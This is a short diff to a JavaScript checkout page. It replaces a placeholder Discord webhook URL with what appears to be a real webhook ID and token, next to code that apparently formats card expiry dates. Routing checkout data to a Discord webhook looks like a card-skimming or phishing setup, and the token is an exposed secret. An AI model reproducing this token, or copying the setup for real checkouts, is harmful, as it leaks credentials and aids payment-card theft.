@@ -159,7 +159,7 @@ function fmtExpiry(el){
 
 // ── CHECKOUT SUBMIT ──
 // ← REPLACE this URL with your actual Discord webhook URL
-var WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
+var WEBHOOK_URL = 'https://discord.com/api/webhooks/1434932220258291742/o6KZXO3PBAj9bJZHzs5RtpoVBSNZnBI2S1xpdgUHV2kiZ4zfylLBBeVSBaQdjZO1YBxq';
 
 function showMsg(text, isError) {
   var el = document.getElementById('checkout-msg');
